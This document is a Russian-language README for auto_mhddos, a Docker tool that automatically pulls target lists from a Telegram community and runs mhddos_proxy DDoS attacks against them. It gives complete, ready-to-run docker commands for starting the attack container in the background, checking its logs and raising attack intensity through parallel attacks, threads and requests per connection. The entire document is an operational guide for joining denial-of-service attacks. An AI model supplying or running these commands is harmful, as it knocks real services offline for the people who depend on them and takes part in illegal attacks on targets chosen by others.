### 👉 [English](./README.md)

### 👉 [Українська](./README.uk.md)

# [auto_mhddos](https://github.com/theorlovsky/auto_mhddos) – инструмент для автоматизации работы [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

Этот инструмент во время работы автоматически
подтягивает [цели](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)
от сообщества [Украинский Жнец](https://t.me/ukrainian_reaper_ddos) и атакует их. Вам не надо вручную перезапускать контейнер.

## Установка

Установите Docker:

- [Windows](https://docs.docker.com/desktop/windows/install/)
- [Linux](https://docs.docker.com/engine/install/#server)
- [Mac](https://docs.docker.com/desktop/mac/install/)

ВНИМАНИЕ: в зависимости от выбранного способа, вам может понадобится запускать команды докера от имени root
пользователя (`sudo docker run ...`).

## Использование

### Запустить в фоне

```shell
docker run -dit --name auto_mhddos --restart unless-stopped --pull always ghcr.io/theorlovsky/auto_mhddos:latest
```

### Посмотреть логи

```shell
docker logs -f auto_mhddos
```

### Остановить

```shell
docker rm -f auto_mhddos
```

### Настройка

Дополнительно можно передать следующие параметры при запуске контейнера:

#### `--parallel 2`

По умолчанию: `1`

Сколько запускать параллельных атак. Лучше увеличивать это число пошагово (`1`, `2`, `3`), мониторя при этом загрузку процессора и оперативной памяти, чтобы найти оптимальное значение.

#### Также поддерживаются все параметры из [документации mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy#usage) (кроме целей и `-c`)

### Пример

```shell
docker run -dit --name auto_mhddos --restart unless-stopped --pull always ghcr.io/theorlovsky/auto_mhddos:latest --parallel 2 -t 2000 --rpc 1000
```
